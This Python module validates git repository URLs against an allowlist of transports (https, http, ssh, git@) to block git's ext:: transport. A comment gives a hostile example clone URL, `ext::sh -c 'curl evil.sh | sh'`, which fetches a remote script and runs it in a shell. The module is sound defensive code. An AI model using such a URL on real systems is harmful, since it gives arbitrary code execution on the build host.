"""Which repository URLs are safe to hand to git.

A policy decision about strings, so it lives in the domain rather than beside
the subprocess that consumes it — the API needs to apply the same rule when a
project is created, long before anything is cloned.
"""

from __future__ import annotations

from forge.domain.errors import InvalidRequest

#: The only transports allowed in a repository URL.
#:
#: `ext::` is the reason this is an allowlist rather than a check for the
#: obviously bad. Git's ext transport treats the rest of the URL as a shell
#: command and runs it, so `ext::sh -c 'curl evil.sh | sh'` is a valid clone
#: URL and cloning it is arbitrary code execution on the build host. Anything
#: not named here is refused before git sees it.
ALLOWED_SCHEMES = ("https://", "http://", "ssh://", "git@")


def validate_repo_url(url: str) -> str:
    cleaned = url.strip()
    if not cleaned:
        raise InvalidRequest("Repository URL is required")
    if not cleaned.startswith(ALLOWED_SCHEMES):
        raise InvalidRequest(
            f"Unsupported repository URL {cleaned!r}. Use an https:// or ssh:// "
            "URL — other git transports can execute commands on this host."
        )
    return cleaned
